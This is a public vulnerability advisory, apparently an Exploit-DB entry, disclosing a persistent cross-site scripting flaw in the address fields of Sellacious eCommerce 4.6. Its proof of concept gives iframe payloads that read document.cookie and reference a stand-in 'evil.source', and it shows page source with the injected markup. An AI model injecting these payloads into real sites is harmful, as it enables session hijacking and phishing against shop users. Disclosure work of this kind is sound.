@@ -1,0 +1,138 @@
+# Exploit Title: Sellacious eCommerce 4.6 - Persistent Cross-Site Scripting
+# Exploit Author: gurbanli
+# Date: 2020-05-13
+# Vendor Homepage: https://www.sellacious.com
+# Version: 4.6
+# Software Link:  https://www.sellacious.com/free-open-source-ecommerce-software
+
+Document Title:
+===============
+Sellacious eCommerce - Multiple Persistent Vulnerabilities
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2226
+
+
+Common Vulnerability Scoring System:
+====================================
+4.6
+
+
+Product & Service Introduction:
+===============================
+https://www.sellacious.com/free-open-source-ecommerce-software
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-05-08: Public Disclosure (Vulnerability Laboratory)
+
+
+Technical Details & Description:
+================================
+A persistent input validation web vulnerability has been discovered in
+the official Sellacious eCommerce Shop CMS (2020 Q1).
+The vulnerability allows remote attackers to inject own malicious script
+codes with persistent attack vector to compromise
+browser to web-application requests from the application-side.
+
+The cross site web vulnerabilities are located in the all the adress
+input fields of the `Manage Your Addresses` module.
+Remote attackers are able to register a low privilege user account to
+inject own malicious script code to the adress
+information page. The execution of the script code occurs each time the
+adress information is used in the web ui of
+the ecommerce application. The request method to inject is POST and the
+attack vector is persistent on the application-side.
+
+Successful exploitation of the vulnerabilities results in session
+hijacking, persistent phishing attacks, persistent
+external redirects to malicious source and persistent manipulation of
+affected application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Module(s):
+[+] Manage Your Addresses
+
+Vulnerable Input(s):
+[+] Full name
+[+] First name
+[+] Middle name
+[+] Last name
+[+] Company
+[+] PO Box
+[+] Address
+[+] Landmark
+
+Affected(s):
+[+] index.php/manage-your-addresses
+[+] Backend user adress information listing
+
+
+Proof of Concept (PoC):
+=======================
+The persistent input validation web vulnerabilities can be exploited by
+remote attackers with user account and low user interaction.
+For security demonstration or to reproduce the web vulnerability follow
+the provided information and steps below to continue.
+
+
+PoC: Exploitation
+<iframe src="evil.source" onload=alert(document.cookie)>
+<iframe src="evil.source" onload=alert(document.domain)>
+
+
+PoC: Vulnerable Source
+<div class="addresses-container">
+<div class="address-heading">
+<h2>Your addresses
+<a href="#address-form-0" role="button" data-toggle="ctech-modal"
+class="ctech-mb-3 btn-add-address ctech-float-right ctech-text-primary">
+<i class="fa fa-plus"></i> <span class="add-address-text">Add New
+Address</span></a></h2></div>
+<div id="addresses" class="cart-aio ctech-text-center">
+<div id="address-editor">
+<ul id="address-items" data-original-title="" title=""> <li
+class="address-item" id="address-item-9"> <div class="ctech-float-right
+address-action">
+<button type="button" class="ctech-btn ctech-btn-small ctech-btn-default
+hasTooltip remove-address" data-placement="bottom" data-id="9" title=""
+data-original-title="Delete"><i class="fa fa-trash-alt"></i></button> <a
+href="#address-form-9" role="button" data-toggle="ctech-modal"
+data-placement="bottom"
+class="ctech-btn ctech-btn-small ctech-btn-default hasTooltip" title=""
+data-original-title="Edit"><i class="fa fa-edit"></i></a> </div>
+<div class="address-content"> <span class="address_name">>"<iframe
+src="evil.source"></span> <span class="address_company">>"<iframe
+src="evil.source"></span>
+<span class="address_po_box">PO #: >"<iframe src="evil.source"></span>
+<span class="address_address has-comma">>"<iframe src="evil.source"></span>
+<span class="address_landmark has-comma">>"<iframe
+src="evil.source"></span> <span class="address_country">United
+States</span>
+<div class="cart_address_box w100p"> <div class="cart_address_buttons">
+</div> </div> </div> </li> <li class="address-item odd-address-item">
+<a href="#address-form-0" role="button" data-toggle="ctech-modal"
+class="btn-new-address"><i class="fa fa-plus"></i></a> </li>
+</iframe></span></div></li></ul>
+<div class="ctech-wrapper">
+</div><div class="ctech-clearfix"></div>
+</div><div class="ctech-clearfix"></div>
+</div></div>
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
